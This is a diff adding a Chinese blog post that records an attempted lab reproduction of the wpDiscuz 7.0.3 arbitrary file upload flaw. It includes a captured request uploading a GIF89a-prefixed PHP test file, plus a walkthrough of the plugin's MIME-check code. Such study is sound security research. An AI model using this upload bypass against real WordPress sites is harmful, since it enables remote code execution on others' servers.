@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>Writing | 九世的博客</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="Writing | 九世的博客">
+  <title>记一次失败的代码审计复现 | 九世的博客</title>
+  <meta name="keywords" content=" 漏洞复现 ">
+  <meta name="description" content="记一次失败的代码审计复现 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1466,19 +1466,25 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="page-" class="article article-type-page" itemscope="" itemprop="blogPost">
+        <article id="post-记一次失败的代码审计复现" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">Writing</h1>
+        <h1 class="article-title">记一次失败的代码审计复现</h1>
     
     <div class="article-meta">
         
         
         
+        
+        <span class="tag">
+            
+            <a href="javascript:" class="color5">漏洞复现</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2018-08-05 11:08:20">2018-08-05 11:04</time>
+        创建时间:<time class="date" title="更新时间: 2020-09-20 15:33:18">2020-09-20 13:39</time>
         
     </div>
     <div class="article-meta">
@@ -1500,7 +1506,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现过程"><span class="toc-text">复现过程</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1515,13 +1521,205 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <p>原本想着复现wpDiscuz插件任意文件上传的。后面没成功<br>跟了一下代码不清楚是不是修复了，做个笔记</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>phpstudy<br>php 7.0.2</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/8276" target="_blank" rel="noopener">https://xz.aliyun.com/t/8276</a></p>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>将给出的下载插件链接：<a href="https://downloads.wordpress.org/plugin/wpdiscuz.7.0.3.zip" target="_blank" rel="noopener">https://downloads.wordpress.org/plugin/wpdiscuz.7.0.3.zip</a><br>下载完后解压到<code>wp-content/plugins</code><br><img src="https://s1.ax1x.com/2020/09/20/wT9tzt.png" alt=""></p>
+<p>然后登录wordpress启用插件<br><img src="https://s1.ax1x.com/2020/09/20/wT9asf.png" alt=""></p>
+<p>之后在文章评论区看到如下<br><img src="https://s1.ax1x.com/2020/09/20/wTCs0O.png" alt=""></p>
+<p>根据文章所述，gif头的php进行文件上传，burp抓一波包可以看到如下<br>(上传失败)<br><img src="https://s1.ax1x.com/2020/09/20/wTCgtH.png" alt=""></p>
+<p>先看看请求包，然后去分析代码</p>
+<pre><code>POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: 192.168.1.109
+Content-Length: 653
+Accept: */*
+DNT: 1
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLjgZd9hliOFxBBcg
+Origin: http://192.168.1.109
+Referer: http://192.168.1.109/?p=1
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: wordpress_test_cookie=WP+Cookie+check; comment_author_email_145d7bef132f82360a6cd87256e47c05=admin@qq.com; comment_author_145d7bef132f82360a6cd87256e47c05=admin
+Connection: close
+
+------WebKitFormBoundaryLjgZd9hliOFxBBcg
+Content-Disposition: form-data; name=&quot;action&quot;
+
+wmuUploadFiles
+------WebKitFormBoundaryLjgZd9hliOFxBBcg
+Content-Disposition: form-data; name=&quot;wmu_nonce&quot;
+
+09f13eeda3
+------WebKitFormBoundaryLjgZd9hliOFxBBcg
+Content-Disposition: form-data; name=&quot;wmuAttachmentsData&quot;
+
+undefined
+------WebKitFormBoundaryLjgZd9hliOFxBBcg
+Content-Disposition: form-data; name=&quot;wmu_files[0]&quot;; filename=&quot;test.php&quot;
+Content-Type: application/octet-stream
+
+GIF89a&lt;?php 
+phpinfo();
+a?&gt;
+------WebKitFormBoundaryLjgZd9hliOFxBBcg
+Content-Disposition: form-data; name=&quot;postId&quot;
+
+1
+------WebKitFormBoundaryLjgZd9hliOFxBBcg--
+
+</code></pre><p>这里的action是对应模块的处理函数的key<code>wmuUploadFiles</code><br>admin-ajax.php<br><img src="https://s1.ax1x.com/2020/09/20/wTChct.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/09/20/wTCoB8.png" alt=""></p>
+<p>直接搜索<code>wmuUploadFiles</code>即可找到处理函数所在的位置<br>(这里其实你也可以单步，跟到他调用函数部分,但是实在太乱。过程变量太多<br>类似于wordpress也可以看看，请求的页面接收的参数到哪里处理的。直接搜索那个参数可以快速找到功能处理所在的php)<br><img src="https://s1.ax1x.com/2020/09/20/wTP38A.png" alt=""></p>
+<p>路径在<code>wordpress\wp-content\plugins\wpdiscuz\utils\class.WpdiscuzHelperUpload.php</code><br><img src="https://s1.ax1x.com/2020/09/20/wTPYKP.png" alt=""></p>
+<p>找到处理函数<br>！<a href="https://s1.ax1x.com/2020/09/20/wTiqln.png" target="_blank" rel="noopener"></a></p>
+<p>debug一顿后到312行开始有file请求的处理<br><img src="https://s1.ax1x.com/2020/09/20/wTFZTO.png" alt=""></p>
+<p>关键点在<code>getMimeType</code>和<code>isAllowedFileType</code><br>getMimeType函数</p>
+<pre><code class="php"> private function getMimeType($file, $extension) {
+        $mimeType = &quot;&quot;;
+        if (function_exists(&quot;mime_content_type&quot;)) { //判断mime_content_type函数是否存在，存在就用这个函数处理否则用别的函数或者自己处理
+            $mimeType = mime_content_type($file[&quot;tmp_name&quot;]); // 获取文件MIME 类型
+        } elseif (function_exists(&quot;finfo_open&quot;) &amp;&amp; function_exists(&quot;finfo_file&quot;)) {
+            $finfo = finfo_open(FILEINFO_MIME_TYPE);
+            $mimeType = finfo_file($finfo, $file[&quot;tmp_name&quot;]);
+        } elseif ($extension) {
+            $matches = wp_check_filetype($file[&quot;name&quot;], $this-&gt;options-&gt;content[&quot;wmuMimeTypes&quot;]);
+            $mimeType = empty($matches[&quot;type&quot;]) ? &quot;&quot; : $matches[&quot;type&quot;];
+        }
+        return $mimeType;
+    }
+</code></pre>
+<p>mime_content_type他这个函数一直没有，我以为是版本问题换了之后还是一样。还是到wp_check_filetype函数处理<br><img src="https://s1.ax1x.com/2020/09/20/wTFNtg.png" alt=""></p>
+<p>wp_check_filetype函数<br>根据正则返回对应的MIME类型和文件后缀</p>
+<pre><code class="php">function wp_check_filetype( $filename, $mimes = null ) { //test.gif
+    if ( empty( $mimes ) ) {
+        $mimes = get_allowed_mime_types(); //返回对应后缀和对应的MIME类型
+    }
+    $type = false;
+    $ext  = false;
+
+    foreach ( $mimes as $ext_preg =&gt; $mime_match ) {
+        $ext_preg = &#39;!\.(&#39; . $ext_preg . &#39;)$!i&#39;;
+        if ( preg_match( $ext_preg, $filename, $ext_matches ) ) { //正则匹配后缀文件名
+            $type = $mime_match; //对应的MIME类型
+            $ext  = $ext_matches[1]; //返回文件名
+            break;
+        }
+    }
+
+    return compact( &#39;ext&#39;, &#39;type&#39; );
+}
+</code></pre>
+<p><img src="https://s1.ax1x.com/2020/09/20/wTF0cn.png" alt=""></p>
+<p>上传php的时候$mimeType类型最后为空(自己测的时候)<br><img src="https://s1.ax1x.com/2020/09/20/wTkI2j.png" alt=""></p>
+<p>然后到文件头部判断<code>getMimeTypeFromContent</code></p>
+<pre><code class="php">    public function getMimeTypeFromContent($path) {
+        $fileContent = $path &amp;&amp; function_exists(&quot;file_get_contents&quot;) &amp;&amp; ($v = file_get_contents($path)) ? $v : &quot;&quot;; //读取文件内容
+        if ($fileContent &amp;&amp; preg_match(&#39;/\A(?:(\xff\xd8\xff)|(GIF8[79]a)|(\x89PNG\x0d\x0a)|(BM)|(\x49\x49(?:\x2a\x00|\x00\x4a))|(FORM.{4}ILBM))/&#39;, $fileContent, $hits)) { //文件头信息获取
+            $type = [
+                1 =&gt; &quot;jpeg&quot;,
+                2 =&gt; &quot;gif&quot;,
+                3 =&gt; &quot;png&quot;,
+                4 =&gt; &quot;bmp&quot;,
+                5 =&gt; &quot;tiff&quot;,
+                6 =&gt; &quot;ilbm&quot;,
+            ];
+            return $type[count($hits) - 1]; //$hits统计出的数量减1，然后在到$type取对应的后缀
+        }
+        return false;
+    }
+
+</code></pre>
+<p>测试的payload为<code>GIF98a&lt;?php phpinfo();?&gt;</code>这里获取到的是gif<br><img src="https://s1.ax1x.com/2020/09/20/wTAtzj.png" alt=""></p>
+<p>然后又进到<code>wp_check_filetype</code>函数…判断后缀<br>(返回false)<br><img src="https://s1.ax1x.com/2020/09/20/wTAgSJ.png" alt=""></p>
+<p>然后到了</p>
+<pre><code class="php"> $mimeType = empty($matches[&quot;type&quot;]) ? &quot;&quot; : $matches[&quot;type&quot;];
+</code></pre>
+<p>由于返回false这里就返回空<br><img src="https://s1.ax1x.com/2020/09/20/wTEEmq.png" alt=""></p>
+<p>然后到<code>isAllowedFileType</code>函数判断<br><img src="https://s1.ax1x.com/2020/09/20/wTE4js.md.png" alt=""></p>
+<pre><code class="php">   private function isAllowedFileType($mimeType) {
+        $isAllowed = false;
+        if (!empty($this-&gt;options-&gt;content[&quot;wmuMimeTypes&quot;]) &amp;&amp; is_array($this-&gt;options-&gt;content[&quot;wmuMimeTypes&quot;])) {
+            $isAllowed = in_array($mimeType, $this-&gt;options-&gt;content[&quot;wmuMimeTypes&quot;]);
+        }
+        return $isAllowed;
+    }
+</code></pre>
+<p>判断类型是否在数组里面<br><img src="https://s1.ax1x.com/2020/09/20/wTVpHx.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/09/20/wTVi4O.png" alt=""></p>
+<p><code>$isAllowed</code>返回False，然后<code>$error</code>为True，返回错误<br><img src="https://s1.ax1x.com/2020/09/20/wTVQ58.png" alt=""></p>
+<p>报错为类型(MIME)错误</p>
+<p>（就在快发布的时候乱想，然后成了。就tm离谱）（但是不使用GIF89a头，因为加上那个头部的话又到getMimeTypeFromContent函数里面了，后缀正则匹配不到<br>给返回个False）<br>但是如果<code>getMimeType</code>这里用的是mime_content_type的话确实是可以进行文件上传<br>为了验证，手动将isAllowedFileType返回修改为true<br><img src="https://s1.ax1x.com/2020/09/20/wTm38O.png" alt=""></p>
+<p>然后到348行进行文件处理上传<br><img src="https://s1.ax1x.com/2020/09/20/wTKpbd.png" alt=""></p>
+<p><code>uploadSingleFile</code>函数</p>
+<pre><code class="php">private function uploadSingleFile($file) {
+        $currentTime = WpdiscuzHelper::getMicrotime(); //获取时间戳
+        $attachmentData = [];
+        $path = $this-&gt;wpUploadsPath . &quot;/&quot;; //当前年月日的文件夹
+        $fName = $file[&quot;name&quot;]; //文件名
+        $pathInfo = pathinfo($fName); //分割路径
+        $realFileName = $pathInfo[&quot;filename&quot;];
+        $ext = empty($pathInfo[&quot;extension&quot;]) ? &quot;&quot; : strtolower($pathInfo[&quot;extension&quot;]);
+        $sanitizedName = sanitize_file_name($realFileName);
+        $cleanFileName = $sanitizedName . &quot;-&quot; . $currentTime . &quot;.&quot; . $ext; //时间戳后缀拼接
+        $cleanRealFileName = $sanitizedName . &quot;.&quot; . $ext;
+        $fileName = $path . $cleanFileName; //路径拼接
+
+        if (in_array($ext, [&quot;jpeg&quot;, &quot;jpg&quot;])) { //没进去
+            $this-&gt;imageFixOrientation($file[&quot;tmp_name&quot;]);
+        }
+
+        $success = apply_filters(&quot;wpdiscuz_mu_compress_image&quot;, false, $file[&quot;tmp_name&quot;], $fileName, $q = 60);
+        if ($success || @move_uploaded_file($file[&quot;tmp_name&quot;], $fileName)) { //文件移动
+            $postParent = apply_filters(&quot;wpdiscuz_mu_attachment_parent&quot;, 0);
+            $attachment = [
+                &quot;guid&quot; =&gt; $this-&gt;wpUploadsUrl . &quot;/&quot; . $cleanFileName,
+                &quot;post_mime_type&quot; =&gt; $file[&quot;type&quot;],
+                &quot;post_title&quot; =&gt; preg_replace(&quot;#\.[^.]+$#&quot;, &quot;&quot;, wp_slash($fName)),
+                &quot;post_excerpt&quot; =&gt; wp_slash($fName),
+                &quot;post_content&quot; =&gt; &quot;&quot;,
+                &quot;post_status&quot; =&gt; &quot;inherit&quot;,
+                &quot;post_parent&quot; =&gt; $postParent
+            ];
+
+            if ($attachId = wp_insert_attachment($attachment, $fileName)) {
+                add_filter(&quot;intermediate_image_sizes&quot;, [&amp;$this, &quot;getImagesSizes&quot;]);
+                $attachData = wp_generate_attachment_metadata($attachId, $fileName);
+                wp_update_attachment_metadata($attachId, $attachData);
+                update_post_meta($attachId, &quot;_wp_attachment_image_alt&quot;, $fName);
+                $ip = WpdiscuzHelper::getRealIPAddr();
+                update_post_meta($attachId, self::METAKEY_ATTCHMENT_OWNER_IP, $ip);
+                update_post_meta($attachId, self::METAKEY_ATTCHMENT_COMMENT_ID, 0);
+                $attachmentData[&quot;id&quot;] = $attachId;
+                $attachmentData[&quot;url&quot;] = empty($attachData[&quot;sizes&quot;][&quot;thumbnail&quot;][&quot;file&quot;]) ? $this-&gt;wpUploadsUrl . &quot;/&quot; . $cleanFileName : $this-&gt;wpUploadsUrl . &quot;/&quot; . $attachData[&quot;sizes&quot;][&quot;thumbnail&quot;][&quot;file&quot;];
+                $attachmentData[&quot;fullname&quot;] = $cleanRealFileName;
+                $attachmentData[&quot;shortname&quot;] = $this-&gt;getFileName($cleanRealFileName);
+            }
+        }
+        return $attachmentData;
+    }
+</code></pre>
+<p><img src="https://s1.ax1x.com/2020/09/20/wTM7fx.png" alt=""></p>
+
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
     </div>
 </article>
 
 
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>记一次失败的代码审计复现</p>
+    
+    <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
+    <p><span class="copy-title">发布时间:</span>2020-09-20, 13:39:07</p>
+    <p><span class="copy-title">最后更新:</span>2020-09-20, 15:33:18</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/8a502742.html" title="记一次失败的代码审计复现">http://422926799.github.io/posts/8a502742.html</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
 
 
 
